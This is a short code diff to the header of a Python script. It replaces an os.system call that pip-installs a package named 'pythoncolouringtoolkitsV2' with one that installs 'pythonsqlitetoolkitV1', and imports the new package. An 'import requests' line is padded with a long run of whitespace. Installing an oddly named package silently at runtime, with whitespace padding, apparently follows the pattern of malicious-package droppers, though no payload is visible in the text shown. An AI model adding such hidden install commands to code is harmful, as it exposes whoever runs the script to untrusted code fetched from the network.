@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolouringtoolkitsV2")
-import pythoncolouringtoolkitsV2
+os.system("pip install pythonsqlitetoolkitV1")
+import pythonsqlitetoolkitV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
